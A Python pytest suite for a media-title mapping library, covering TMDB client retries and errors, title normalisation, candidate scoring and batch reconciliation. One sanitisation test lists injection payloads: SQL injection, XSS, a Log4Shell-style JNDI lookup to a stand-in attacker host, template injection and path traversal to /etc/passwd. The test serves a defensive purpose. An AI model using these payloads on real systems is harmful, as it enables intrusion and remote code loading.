from __future__ import annotations

import asyncio
import time

import httpx
import pytest
import respx

from orion_mapper.core.config import Settings
from orion_mapper.core.http import AsyncHttpClient
from orion_mapper.core.rate_limiter import TokenBucketLimiter
from orion_mapper.matcher.normalizer import (
    ParsedTitle,
    TitleNormalizer,
)
from orion_mapper.matcher.reconciler import IdentityReconciler
from orion_mapper.matcher.scoring import (
    CandidateScorer,
    MatchResult,
)
from orion_mapper.models.item import ContentType, ScrapedItem
from orion_mapper.models.mapping import CanonicalMapping
from orion_mapper.resolver.tmdb import TmdbClient


# ==============================================================================
# Helper Mock Master Store
# ==============================================================================
class MockStore:
    def __init__(self):
        self.by_tmdb: dict[tuple[str, str], CanonicalMapping] = {}
        self.by_imdb: dict[tuple[str, str], CanonicalMapping] = {}

    def get_by_tmdb(self, tmdb_id: str, content_type: str | ContentType) -> CanonicalMapping | None:
        return self.by_tmdb.get((str(tmdb_id), str(content_type).lower()))

    def get_by_imdb(self, imdb_id: str, content_type: str | ContentType) -> CanonicalMapping | None:
        return self.by_imdb.get((str(imdb_id), str(content_type).lower()))

    def save_mapping(self, mapping: CanonicalMapping) -> None:
        c_type = str(mapping.type).lower()
        if mapping.tmdb_id:
            self.by_tmdb[(str(mapping.tmdb_id), c_type)] = mapping
        if mapping.imdb_id:
            self.by_imdb[(str(mapping.imdb_id), c_type)] = mapping


# ==============================================================================
# 1. TmdbClient Adversarial & Stress Generators
# ==============================================================================

@pytest.mark.asyncio
async def test_tmdb_429_rate_limit_burst_and_recovery(test_settings: Settings, monkeypatch):
    """
    Stress test: TMDB API returns 429 Too Many Requests burst with Retry-After header.
    Verify that TmdbClient backs off, retries, and successfully recovers.
    """
    sleep_calls: list[float] = []
    real_sleep = asyncio.sleep

    async def fake_sleep(delay: float):
        sleep_calls.append(delay)
        await real_sleep(0.001)

    monkeypatch.setattr(asyncio, "sleep", fake_sleep)

    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        respx_mock.get("/3/find/tt0137523").side_effect = [
            httpx.Response(429, headers={"Retry-After": "2"}, json={"status_message": "Rate limit exceeded"}),
            httpx.Response(429, headers={"Retry-After": "1"}, json={"status_message": "Rate limit exceeded"}),
            httpx.Response(200, json={
                "movie_results": [{"id": 550, "title": "Fight Club", "media_type": "movie"}],
                "tv_results": [],
            }),
        ]

        async with AsyncHttpClient(config=test_settings) as http_client:
            client = TmdbClient(http_client=http_client)
            res = await client.find_by_imdb_id("tt0137523")

            assert res is not None
            assert res["id"] == 550
            assert res["title"] == "Fight Club"
            assert len(sleep_calls) == 2
            assert sleep_calls[0] == 2.0
            assert sleep_calls[1] == 1.0


@pytest.mark.asyncio
async def test_tmdb_500_503_transient_failures_recovery(test_settings: Settings):
    """
    Fault tolerance test: TMDB API returns 500 Internal Server Error, then 503 Service Unavailable,
    then recovers with 200 OK.
    """
    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        respx_mock.get("/3/movie/550/external_ids").side_effect = [
            httpx.Response(500, text="Internal Server Error"),
            httpx.Response(503, text="Service Unavailable"),
            httpx.Response(200, json={"id": 550, "imdb_id": "tt0137523"}),
        ]

        async with AsyncHttpClient(config=test_settings) as http_client:
            client = TmdbClient(http_client=http_client)
            res = await client.get_external_ids("550", "movie")

            assert res is not None
            assert res["imdb_id"] == "tt0137523"


@pytest.mark.asyncio
async def test_tmdb_500_server_error_exhaustion(test_settings: Settings):
    """
    Error handling test: Continuous 500 errors exceeding http_max_retries.
    Verify TmdbClient catches MaxRetriesExceededError and returns None or [] gracefully without crashing.
    """
    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        respx_mock.get("/3/find/tt0137523").respond(500, text="Continuous 500 Server Error")
        respx_mock.get("/3/search/movie").respond(500, text="Continuous 500 Server Error")
        respx_mock.get("/3/movie/550/external_ids").respond(500, text="Continuous 500 Server Error")
        respx_mock.get("/3/movie/550").respond(500, text="Continuous 500 Server Error")

        async with AsyncHttpClient(config=test_settings) as http_client:
            client = TmdbClient(http_client=http_client)

            assert await client.find_by_imdb_id("tt0137523") is None
            assert await client.search("Fight Club", "movie") == []
            assert await client.get_external_ids("550", "movie") is None
            assert await client.get_details("550", "movie") is None


@pytest.mark.asyncio
async def test_tmdb_invalid_api_key_401_handling(test_settings: Settings):
    """
    Security/Auth test: TMDB returns 401 Unauthorized for invalid/revoked API key.
    Verify client immediately returns None (no retries) and handles the error gracefully.
    """
    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        route = respx_mock.get("/3/find/tt0137523").respond(
            401,
            json={"status_code": 7, "status_message": "Invalid API key: You must be granted a valid key."},
        )

        async with AsyncHttpClient(config=test_settings) as http_client:
            client = TmdbClient(api_key="invalid_bad_api_key", http_client=http_client)
            res = await client.find_by_imdb_id("tt0137523")

            assert res is None
            assert route.call_count == 1  # 401 should not be retried


@pytest.mark.asyncio
async def test_tmdb_empty_and_null_query_strings(mock_http_client):
    """
    Edge case: Empty, whitespace-only, and special empty queries to all TmdbClient methods.
    Verify no network requests are dispatched and correct default empty values are returned.
    """
    client = TmdbClient(http_client=mock_http_client)

    # find_by_imdb_id
    assert await client.find_by_imdb_id("") is None
    assert await client.find_by_imdb_id("   ") is None
    assert await client.find_by_imdb_id("\t\n") is None

    # get_external_ids
    assert await client.get_external_ids("", "movie") is None
    assert await client.get_external_ids("   ", "tv") is None

    # search
    assert await client.search("", "movie") == []
    assert await client.search("   ", "tv") == []
    assert await client.search("\n\t  ", "series") == []

    # get_details
    assert await client.get_details("", "movie") is None
    assert await client.get_details("   ", "tv") is None


@pytest.mark.asyncio
async def test_tmdb_malformed_json_and_payload_anomalies(test_settings: Settings):
    """
    Adversarial test: TMDB returns unexpected payload schemas:
    - Root payload is a list instead of dict
    - Root payload is an empty dict
    - Missing 'results', 'movie_results', 'tv_results'
    - 'results' is a non-list type
    """
    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        respx_mock.get("/3/find/tt_list").respond(200, json=[{"id": 1}])
        respx_mock.get("/3/find/tt_empty_dict").respond(200, json={})
        respx_mock.get("/3/find/tt_null_results").respond(200, json={"movie_results": None, "tv_results": None})
        respx_mock.get("/3/find/tt_bad_type").respond(200, json={"movie_results": "not_a_list"})
        respx_mock.get("/3/search/movie").respond(200, json={"results": "invalid_not_a_list"})

        async with AsyncHttpClient(config=test_settings) as http_client:
            client = TmdbClient(http_client=http_client)

            assert await client.find_by_imdb_id("tt_list") is None
            assert await client.find_by_imdb_id("tt_empty_dict") is None
            assert await client.find_by_imdb_id("tt_null_results") is None
            assert await client.find_by_imdb_id("tt_bad_type") is None
            assert await client.search("Query", "movie") == []


@pytest.mark.asyncio
async def test_tmdb_high_concurrency_stress():
    """
    Stress test: 100 concurrent requests through TmdbClient with TokenBucketLimiter.
    Verify no race condition, deadlock, or unhandled token depletion error.
    """
    limiter = TokenBucketLimiter(rate=200.0, capacity=20.0)

    with respx.mock(base_url="https://api.themoviedb.org") as respx_mock:
        respx_mock.get(url__regex=r"/3/find/.*").respond(
            200,
            json={"movie_results": [{"id": 550, "title": "Fight Club"}]},
        )

        async with AsyncHttpClient(rate_limiter=limiter) as http_client:
            client = TmdbClient(http_client=http_client, rate_limiter=limiter)
            tasks = [client.find_by_imdb_id(f"tt01375{i:02d}") for i in range(100)]
            results = await asyncio.gather(*tasks)

            assert len(results) == 100
            assert all(r is not None and r["id"] == 550 for r in results)


# ==============================================================================
# 2. TitleNormalizer Malicious Inputs & Corner Cases
# ==============================================================================

def test_normalizer_malicious_null_bytes_and_control_chars():
    """
    Adversarial test: Strings embedded with null bytes (\\x00), backspaces (\\x08),
    formfeeds (\\x0c), ANSI escapes, zero-width characters (\\u200b, \\u200c, \\ufeff).
    """
    dirty_inputs = [
        "Fight\x00Club\x00(1999)\x00[1080p]",
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f Matrix \x1b[31mRed\x1b[0m",
        "Zombieland\u200bSaga\u200c\u200d\ufeff Season \u200e1",
        "El\tClub\r\n\x0bde\x0cla\x00Lucha",
    ]

    for dirty in dirty_inputs:
        normalized = TitleNormalizer.normalize(dirty)
        parsed = TitleNormalizer.parse(dirty)

        assert "\x00" not in normalized
        assert "\x00" not in parsed.normalized_title
        assert isinstance(normalized, str)
        assert isinstance(parsed, ParsedTitle)

    assert TitleNormalizer.normalize("Fight\x00Club\x00(1999)\x00[1080p]") == "fight club 1999"


def test_normalizer_1000_noise_tokens_stress():
    """
    Stress test: Malicious title composed of 1,000+ repeating noise words.
    Verify memory safety, sub-millisecond execution, and complete stripping.
    """
    noise_stream = " ".join([
        "audio latino castellano completa hd 4k 1080p 720p bluray dvdrip rip webrip dual subtitulado online"
    ] * 60)  # ~1020 tokens
    dirty_title = f"The Matrix {noise_stream} 1999"

    start = time.perf_counter()
    normalized = TitleNormalizer.normalize(dirty_title)
    parsed = TitleNormalizer.parse(dirty_title, year=1999)
    elapsed = time.perf_counter() - start

    assert normalized == "the matrix 1999"
    assert parsed.base_title == "the matrix"
    assert parsed.year == 1999
    assert elapsed < 0.10, f"1000 noise tokens took {elapsed:.4f}s"


def test_normalizer_emoji_only_and_surrogate_pairs():
    """
    Adversarial test: Emoji-only strings, skin-tone modifiers, ZWJ sequences.
    """
    emoji_titles = [
        "🍿🎬🔥✨🤖💀🏴‍☠️",
        "👨‍👩‍👧‍👦 🏎️ 💨",
        "👍🏻👍🏼👍🏽👍🏾👍🏿",
    ]

    for em in emoji_titles:
        normalized = TitleNormalizer.normalize(em)
        assert normalized == ""


def test_normalizer_multilingual_scripts():
    """
    Adversarial test: Non-Latin multilingual scripts (Cyrillic, Greek, Arabic, Hebrew, CJK, Devanagari).
    """
    scripts = [
        "Брат 2 (2000)",  # Cyrillic
        "Άλφα (2018)",    # Greek
        "سلام بر عشق",     # Arabic / Persian
        "שלום עליכם",      # Hebrew
        "卧虎藏龙 (2000)", # Chinese
        "進撃の巨人 Season 3", # Japanese
        "기생충 (2019)",   # Korean
        "दंगल (2016)",     # Devanagari
    ]

    for s in scripts:
        normalized = TitleNormalizer.normalize(s)
        parsed = TitleNormalizer.parse(s)
        assert isinstance(normalized, str)
        assert isinstance(parsed, ParsedTitle)


def test_normalizer_sql_xss_injection_payloads():
    """
    Security sanitization test: SQL injection, XSS vectors, command injection, and template tags in titles.
    Verify they are safely transformed into benign alphanumeric strings without error.
    """
    injections = [
        "Fight Club'; DROP TABLE mappings; --",
        '<script>alert("XSS")</script> Matrix 1999',
        '"><svg onload=alert(1)> Inception',
        "${jndi:ldap://evil.attacker.com/a} Avatar",
        "{{ 7 * 7 }} Interstellar",
        "../../../etc/passwd The Godfather",
    ]

    for inj in injections:
        normalized = TitleNormalizer.normalize(inj)
        parsed = TitleNormalizer.parse(inj)

        assert "<" not in normalized
        assert ">" not in normalized
        assert ";" not in normalized
        assert "'" not in normalized
        assert "/" not in normalized
        assert isinstance(parsed, ParsedTitle)


# ==============================================================================
# 3. CandidateScorer & FuzzyMatcher Empirical Vulnerability Checks
# ==============================================================================

def test_candidate_scorer_corrupt_candidate_safe_recovery():
    """
    Check CandidateScorer robustness against malformed candidate dictionaries.
    """
    parsed = TitleNormalizer.parse("Fight Club", year=1999)

    candidates = [
        {},
        {"id": None, "title": None, "release_date": None},
        {"id": "550", "title": "Fight Club", "release_date": "1999-10-15"},
    ]

    for cand in candidates:
        res = CandidateScorer.score_candidate(parsed, cand, content_type="movie")
        assert isinstance(res, MatchResult)
        assert isinstance(res.score, float)


# ==============================================================================
# 4. IdentityReconciler Batch & Store Merging
# ==============================================================================

@pytest.mark.asyncio
async def test_reconciler_batch_stress_100_items():
    """
    High-volume batch stress test: 100 items with overlapping and distinct identities.
    Verify correct grouping into canonical mappings without duplication.
    """
    class FastMockTmdbClient(TmdbClient):
        async def find_by_imdb_id(self, imdb_id):
            if "0137523" in imdb_id:
                return {"id": 550, "title": "Fight Club", "media_type": "movie"}
            return {"id": 82856, "name": "Zombieland Saga", "media_type": "tv"}

        async def get_external_ids(self, tmdb_id, media_type):
            if str(tmdb_id) == "550":
                return {"imdb_id": "tt0137523"}
            return {"imdb_id": "tt15486"}

    reconciler = IdentityReconciler(tmdb_client=FastMockTmdbClient())

    items: list[ScrapedItem] = []
    for i in range(50):
        items.append(ScrapedItem(
            provider=f"provider_{i % 5}",
            slug=f"fight-club-{i}",
            title="Fight Club",
            type=ContentType.MOVIE,
            tmdb_id="550",
        ))
    for i in range(50):
        items.append(ScrapedItem(
            provider=f"provider_{i % 5}",
            slug=f"zombieland-{i}",
            title="Zombieland Saga",
            type=ContentType.SERIES,
            imdb_id="tt15486",
        ))

    start = time.perf_counter()
    mappings = await reconciler.reconcile_batch(items)
    elapsed = time.perf_counter() - start

    assert len(mappings) == 2
    by_id = {m.tmdb_id: m for m in mappings}

    assert "550" in by_id
    assert by_id["550"].imdb_id == "tt0137523"
    assert len(by_id["550"].providers) == 5

    assert "82856" in by_id
    assert by_id["82856"].imdb_id == "tt15486"
    assert len(by_id["82856"].providers) == 5

    assert elapsed < 0.25
